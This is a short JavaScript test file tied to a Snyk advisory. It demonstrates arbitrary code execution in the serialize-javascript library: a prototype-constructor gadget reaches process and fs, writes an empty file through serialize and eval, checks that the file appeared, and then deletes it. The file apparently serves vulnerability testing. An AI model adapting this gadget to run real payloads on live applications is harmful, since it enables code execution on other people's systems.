//https://security.snyk.io/vuln/SNYK-JS-SERIALIZEJAVASCRIPT-570062
test("Arbitrary code execution in serialize-javascript", () => {
  const fs = require("fs");
  const serialize = require("serialize-javascript");
  const path = "./serialize-javascript";
  //const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  eval(
    "(" +
      serialize({
        str:
          "string" +
          this.constructor
            .constructor(`return process`)()
            .mainModule.require(`fs`)
            .writeFileSync(`serialize-javascript`, ``),
      }) +
      ")"
  );

  //sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
